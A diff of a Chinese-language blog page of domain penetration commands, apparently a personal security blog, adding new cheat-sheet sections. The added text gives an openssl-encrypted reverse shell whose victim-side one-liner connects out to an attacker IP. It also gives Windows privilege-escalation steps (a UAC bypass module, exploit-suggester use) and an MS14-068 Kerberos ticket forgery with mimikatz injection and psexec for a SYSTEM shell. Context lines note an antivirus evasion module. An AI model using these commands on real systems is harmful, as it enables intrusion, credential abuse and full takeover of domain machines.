@@ -84,7 +84,7 @@
             <h1>域渗透常用命令</h1>
             <span class="meta">
             	Posted on
-              2020-06-16，1 min read
+              2020-07-15，3 min read
             </span>
           </div>
         </div>
@@ -129,12 +129,41 @@ dsquery server &amp;&amp; net time /domain
 <pre><code>use evasion/windows/windows_defender_exe
 可绕腾讯电脑管家
 </code></pre>
+<h1 id="不常见的反弹shell">不常见的反弹Shell</h1>
+<pre><code>服务端:
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port 8888
+
+靶机：
+mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.198.200:8888 &gt; /tmp/s; rm /tmp/s
+</code></pre>
+<h1 id="提权">提权</h1>
+<pre><code>windows/local/bypassuac_dotnet_profiler
+自动寻找存在的提权漏洞
+
+python windows-exploit-suggester.py  --update
+systeminfo &gt; info.txt
+python windows-exploit-suggester.py -d 2017-06-14-mssb.xls -i info.txt
+CVE提权辅助脚本
+</code></pre>
+<h1 id="ms14-068">MS14-068</h1>
+<pre><code>本地复现了下。用普通域用户名和密码去创建一个连接。会显示拒绝访问
+MS14-068.exe -u Administrator@abc.com -p 123@abcD -s S-1-5-21-294942478-3080431383-2839947409-500 -d 192.168.0.3
+#会在当前目录生成一个票据
+kerberos::purge 
+#清空当前的票据
+kerberos::ptc 凭证地址
+#注入票据 
+创建票据。mimikatz导入。就可以访问了。但权限还是普通域用户权限
+psesec.exe -accepteula \\dc.abc.com -s cmd.exe
+可以配合psexec -s 得到一个System shell
+</code></pre>
 
           
           <p class="next-post">下一篇：
-            <a href="https://guokeya.github.io/post/9xxCZNo3L/">
+            <a href="https://guokeya.github.io/post/OYFcBePiR/">
               <span class="post-title">
-                Dozer域渗透&rarr;
+                SCTF jsonhub&rarr;
               </span>
             </a>
           </p>
